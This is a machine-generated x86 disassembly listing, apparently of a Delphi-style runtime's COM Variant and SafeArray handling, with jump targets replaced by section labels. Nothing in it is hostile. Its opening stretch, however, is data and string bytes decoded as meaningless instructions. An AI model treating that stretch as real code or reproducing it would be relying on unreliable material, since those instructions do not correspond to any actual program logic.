add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0xfaaa7c1
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
ror [ esi - 0x59ba37fd ] 0x1
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ eax ] al
cmpsd [ esi ] [ edi ]
add ecx [ eax + eax ]
outsd
jb r-xdata
sbb [ ebx - 0x5a ] al
outsd
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax + 0x3a702 ] al
add [ eax ] al
popad
jb r-xdata
popad
jns r-xdata
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ edi ]
inc ebp
push esi
popad
jb r-xdata
jbe r-xdata
jb r-xdata
popad
outsb
je r-xdata
popad
outsb
je r-xdata
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
shl [ eax ] 0x0
outsb
je r-xdata
popad
outsb
je r-xdata
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
insd
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ eax * 2 + 0x69726156 ]
jb r-xdata
add [ eax ] al
jb r-xdata
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebp
push esi
popad
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi * 8 + 0xc03a6 ] bh
add [ eax ] al
ror [ esi - 0x59ba37fd ] 0x1
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
jmp [ esi + 0xc03 ]
add [ eax ] al
lea eax [ eax ]
hlt
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ 0x72615645 ]
imul esp [ ecx + 0x6e ] 0x65764f74
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ 0x72615645 ]
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add edx [ edi ]
inc ebp
push esi
popad
jb r-xdata
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc eax
add [ edx + eax ] bl
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax ] bl
cmpsd [ esi ] [ edi ]
add ecx [ eax + eax ]
add [ eax ] al
ror [ esi - 0x59ba37fd ] 0x1
outsd
jb r-xdata
jbe r-xdata
je r-xdata
cmpsd [ esi ] [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc03a703 ] dh
add [ eax ] al
add [ eax - 0x37fc5902 ] ch
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
dec esp
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
inc eax
add al ch
add ah [ edi + 0x3 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
add ah [ edi + 0xc03 ]
add al dl
mov [ esi - 0x59ba37fd ] fs
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
add [ eax ] al
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc eax
add [ ecx + eax + 0x3a7 ] dh
pop ebp
insb
imul esp [ esi + ecx * 2 + 0x75 ] 0x704f6c6c
inc ebp
dec esi
jne r-xdata
push 0x6f727245
retn
popad
outsb
je r-xdata
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x3
cmpsd [ esi ] [ edi ]
add ecx [ eax + eax ]
add [ eax ] al
test al 0xfe
cmpsb [ esi ] [ edi ]
add ecx eax
outsd
jb r-xdata
outsd
jb r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax - 0x59 ] cl
add ecx [ eax + eax ]
add [ eax ] al
ror [ esi - 0x59ba37fd ] 0x1
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc03a702 ] al
add [ eax ] al
add al dl
mov [ esi - 0x59ba37fd ] fs
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
outsd
scasd [ edi ]
add al 0xa7
add esp [ edi + edi * 8 + 0x30 ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_3a75bbc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_3a75bbc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a704b6
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_3a652c4
retn
call 0xffffffff8f8b51bd
mov ebx eax
xor eax eax
push ebp
push sub_3a704af
push [ fs : eax ]
insb
dec edi
jo r-xdata
shl [ eax + 0x3a703 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7041d
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
outsb
inc ebp
push esi
popad
jb r-xdata
add esp [ edi + 0x3 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
add ecx [ ebp - 0x741703bb ]
dec esi
jb r-xdata
popad
outsb
je r-xdata
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ebx [ edx ]
inc ebp
push esi
popad
jb r-xdata
imul esi [ ebx + 0x70 ] 0x68637461
inc ebp
jb r-xdata
rcl [ ebp + 0x68 ] 0x16
add al 0xa7
add esp [ edi + edi * 8 + 0x30 ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
xor eax eax
pop edx
jb r-xdata
outsd
sub_3a703cc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_3a70416
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7041d
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a70420
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a704af
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_3a75bbc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_3a75bbc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a704b6
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_3a652c4
retn
sub_3a704bc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_3a70506
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7050d
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a70510
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_3a7055a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a70561
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a70564
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a705f3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_3a75bbc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_3a75bbc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a705fa
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_3a652c4
retn
sub_3a70600
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_3a7064a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a70651
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a70654
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3a70899
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a708a0
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_3a652c4
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_3a652c4
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
jmp r-xdata
dec eax
je r-xdata
call sub_3a703cc
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
jmp r-xdata
jmp r-xdata
call sub_3a704bc
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_3a6cae0
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
jmp r-xdata
jmp r-xdata
sub_3a708b4
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_3a70420
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_3a70564
jmp r-xdata
jmp r-xdata
call sub_3a70654
sub_3a708e8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_3a62f64
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
call sub_3a62f64
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_3a708b4
pop esi
pop ebx
retn
call sub_3a62f64
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_3a708b4
jmp r-xdata
call sub_3a62fa4
mov edx eax
mov eax edx
call sub_3a64c34
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_3a708b4
jmp r-xdata
pop esi
pop ebx
retn
sub_3a7096c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_3a709b6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a709bd
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a709d4
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_3a70a04
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_3a70a04
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_3a70a60
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
movzx eax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_3a708a8
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_3a708a8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_3a709d4
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_3a708a8
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_3a708a8
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_3a70a04
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_3a708a8
mov eax [ ebp - 0x314 ]
call sub_3a70c58
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_3a70bdc
push ebx
push esi
push ecx
mov ebx eax
movzx esi [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_3a708a8
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_3a652a0
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_3a7618c
test al al
je r-xdata
mov eax ebx
call sub_3a70a60
jmp r-xdata
push ebx
call VariantClear
push ebx
call VariantInit
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_3a70c74
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_3a70ca4
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_3a70ca4
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_3a70d00
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
movzx eax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_3a708a8
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_3a708a8
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_3a70c58
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_3a70600
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_3a708a8
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_3a708a8
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_3a70c74
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_3a70ca4
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_3a708a8
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_3a708a8
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a70ed4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
movzx edi [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_3a70bdc
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_3a708a8
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_3a652f4
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_3a7618c
test al al
je r-xdata
mov ecx sub_3a70ecc
mov edx esi
mov eax ebx
call sub_3a70d00
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_3a708a8
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_3a70f80
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_3a70ed4
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
